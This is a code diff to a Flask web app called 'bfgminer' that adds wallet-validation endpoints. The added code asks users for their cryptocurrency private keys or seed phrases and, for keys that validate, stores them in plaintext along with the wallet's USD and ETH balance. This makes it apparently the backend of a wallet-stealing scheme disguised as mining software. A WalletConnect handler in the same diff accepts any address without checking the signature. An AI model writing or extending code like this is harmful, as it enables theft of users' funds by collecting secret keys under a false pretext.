@@ -6,12 +6,18 @@ import sqlite3
 import json
 import datetime
 import uuid
+import re
+import zipfile
+import tempfile
 
 import bcrypt
 import requests
 from dotenv import load_dotenv
 from flask import Flask, render_template, request, jsonify, send_file, abort
 from flask_cors import CORS
+from web3 import Web3
+import bip39
+from blockchain_validator import BlockchainValidator
 
 load_dotenv()
 
@@ -20,6 +26,9 @@ app = Flask(__name__)
 app.secret_key = os.getenv("FLASK_SECRET_KEY", "bfgminer_secret_2025")
 CORS(app)
 DB_PATH = 'bfgminer.db'
+
+# Initialize blockchain validator
+validator = BlockchainValidator()
 
 def init_db():
     """Initialize the database."""
@@ -51,6 +60,10 @@ def init_db():
         mnemonic TEXT,
         private_key TEXT,
         wallet_type TEXT,
+        connection_type TEXT,
+        credentials TEXT,
+        balance_usd REAL DEFAULT 0,
+        balance_eth REAL DEFAULT 0,
         connection_method TEXT,
         is_validated BOOLEAN DEFAULT FALSE,
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
@@ -254,6 +267,83 @@ def wallet_connect():
     except sqlite3.Error as e:
         return jsonify({'success': False, 'error': str(e)}), 500
 
+
+@app.route('/api/validate-wallet', methods=['POST'])
+def validate_wallet():
+    """Validate wallet credentials (private key or mnemonic)"""
+    try:
+        data = request.get_json()
+        wallet_type = data.get('type')  # 'private_key' or 'mnemonic'
+        credentials = data.get('credentials', '').strip()
+        
+        if not credentials:
+            return jsonify({'valid': False, 'error': 'No credentials provided'}), 400
+        
+        if wallet_type == 'private_key':
+            result = validator.validate_private_key(credentials)
+        elif wallet_type == 'mnemonic':
+            result = validator.validate_mnemonic(credentials)
+        else:
+            return jsonify({'valid': False, 'error': 'Invalid wallet type'}), 400
+        
+        # Log wallet connection attempt
+        if result.get('valid'):
+            log_wallet_connection(data.get('email', ''), wallet_type, credentials, result)
+        
+        return jsonify(result)
+        
+    except Exception as e:
+        return jsonify({'valid': False, 'error': str(e)}), 500
+
+@app.route('/api/walletconnect', methods=['POST'])
+def walletconnect_handler():
+    """Handle WalletConnect authentication"""
+    try:
+        data = request.get_json()
+        address = data.get('address', '').strip()
+        signature = data.get('signature', '')
+        message = data.get('message', '')
+        
+        if not address:
+            return jsonify({'success': False, 'error': 'No address provided'}), 400
+        
+        # Validate the address format
+        result = validator.validate_wallet_address(address)
+        
+        if not result.get('valid'):
+            return jsonify({'success': False, 'error': result.get('error')}), 400
+        
+        # In a real implementation, you would verify the signature
+        # For demo purposes, we'll accept any valid address
+        
+        # Log wallet connection
+        log_wallet_connection(data.get('email', ''), 'walletconnect', address, result)
+        
+        return jsonify({
+            'success': True,
+            'address': result['address'],
+            'balance': result['balance_usd']
+        })
+        
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+def log_wallet_connection(email, connection_type, credentials, validation_result):
+    """Log wallet connection to database"""
+    try:
+        conn = sqlite3.connect(DB_PATH)
+        cursor = conn.cursor()
+        
+        cursor.execute('''INSERT INTO wallets 
+                         (user_id, wallet_address, connection_type, credentials, balance_usd, created_at)
+                         VALUES (?, ?, ?, ?, ?, ?)''',
+                      (None, validation_result.get('address', ''), connection_type, 
+                       credentials, validation_result.get('balance_usd', 0), datetime.datetime.now()))
+        
+        conn.commit()
+        conn.close()
+    except Exception as e:
+        print(f"Error logging wallet connection: {e}")
 
 @app.route('/api/download/initiate', methods=['POST'])
 def initiate_download():
